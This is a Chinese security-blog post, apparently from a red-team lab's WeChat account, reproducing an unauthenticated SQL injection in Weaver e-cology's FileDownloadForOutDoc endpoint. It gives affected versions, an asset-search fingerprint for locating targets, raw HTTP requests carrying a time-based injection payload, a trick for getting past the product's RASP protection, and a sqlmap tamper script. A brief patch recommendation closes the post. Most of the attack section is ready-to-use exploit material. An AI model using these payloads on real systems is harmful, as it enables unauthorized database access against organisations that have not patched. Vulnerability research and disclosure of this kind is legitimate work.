#  【漏洞复现】泛微e-cology 前台未授权sql注入

原创 请君江南扫落花  [ 暗魂攻防实验室 ](javascript:void\(0\);)

**暗魂攻防实验室** ![]()

微信号 anhunsec-red

功能介绍 专注于网络空间安全、红蓝攻防对抗、渗透测试等技术研究

____

___发表于_

收录于合集 #漏洞复现 10个

**点击蓝字**![](https://gitee.com/fuli009/images/raw/master/public/20230715093502.png)
**关注我们**

![]()

  

  
![](https://gitee.com/fuli009/images/raw/master/public/20230715093503.png)  
![](https://gitee.com/fuli009/images/raw/master/public/20230715093504.png)
**微信搜一搜**![](https://gitee.com/fuli009/images/raw/master/public/20230715093505.png)
暗魂攻防实验室

## 漏洞介绍

泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。

泛微e-cology FileDownloadForOutDoc
未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。

## 影响版本

部分e-cology 8且补丁版本<10.58.0

部分e-cology 9且补丁版本<10.58.0

  

## 资产测绘

app="泛微-协同商务系统"

  

## 漏洞复现

1.访问泛微OA业务系统

![](https://gitee.com/fuli009/images/raw/master/public/20230715093506.png)

2.检测payload

  *   *   *   *   *   *   *   *   * 

    
    
    POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36Content-Length: 45Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateConnection: close  
    fileid=3+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1

3.由于泛微OA启用了RASP，同一个请求执行两次会被拦截，所以需要在请求包中添加随机参数；下面是RASP的介绍

RASP是Runtime Application Self-
Protection（运行时应用自我保护）的缩写，是一种用于保护应用程序免受攻击的安全技术。它是在应用程序运行时进行安全检测和保护的一种方法，可以在应用程序本身内部或与应用程序紧密集成的组件中实现。

  *   *   *   *   *   *   *   *   * 

    
    
    POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36Content-Length: 45Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateConnection: close  
    fileid={random}+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1

4.加载tamper脚本进行注入

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    import randomfrom lib.core.enums import PRIORITY  
    __priority__ = PRIORITY.HIGH  
      
    def tamper(payload, **kwargs):  res = ""  ran = random.randint(1,2**20)  res = str(ran)+payload  return res

![](https://gitee.com/fuli009/images/raw/master/public/20230715093508.png)

## 修复建议

目前官方已发布安全补丁，建议受影响用户尽快将补丁版本升级至10.58及以上。

https://www.weaver.com.cn/cs/securityDownload.asp#

  

![](https://gitee.com/fuli009/images/raw/master/public/20230715093509.png)  
![](https://gitee.com/fuli009/images/raw/master/public/20230715093510.png)

●[浅谈两种复现方式实现PDF_XSS](http://mp.weixin.qq.com/s?__biz=MzkyMjE1NzQ2MA==&mid=2247487941&idx=1&sn=3ae42f268164ca46de5eb5c5d3f841bb&chksm=c1f9f93ef68e702824548e6882a335a946fbfcd84f8e697744ff1b21da4d86c53178129140bd&scene=21#wechat_redirect)

●[anhunsec_redteam_V2.5
正式版红队渗透系统简介](http://mp.weixin.qq.com/s?__biz=MzkyMjE1NzQ2MA==&mid=2247487905&idx=1&sn=e15c3473d01e3c3df522e3edcf81f198&chksm=c1f9f95af68e704ccfd7daa07e310a2de04cb741d3b946a3321c2c4eb7ea062928495b9fc063&scene=21#wechat_redirect)

●[一文读懂面试官都在问的shiro漏洞](http://mp.weixin.qq.com/s?__biz=MzkyMjE1NzQ2MA==&mid=2247487895&idx=1&sn=f3b1e70ae912d804c4ae6d38e3d4c728&chksm=c1f9f96cf68e707aafebbd1822d9d83bb316d5f7c26fe120576eca24f15e38c09ba0e6c7b47a&scene=21#wechat_redirect)

●[记一次小程序渗透测试](http://mp.weixin.qq.com/s?__biz=MzkyMjE1NzQ2MA==&mid=2247487893&idx=1&sn=2ab5b85f426c11767045e54d193157f8&chksm=c1f9f96ef68e70781bce82144f65db363f28507add488da1b0c34c4c3581094ecfad51933e38&scene=21#wechat_redirect)

![](https://gitee.com/fuli009/images/raw/master/public/20230715093511.png)![](https://gitee.com/fuli009/images/raw/master/public/20230715093512.png)微信搜一搜![](https://gitee.com/fuli009/images/raw/master/public/20230715093513.png)暗魂攻防实验室

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

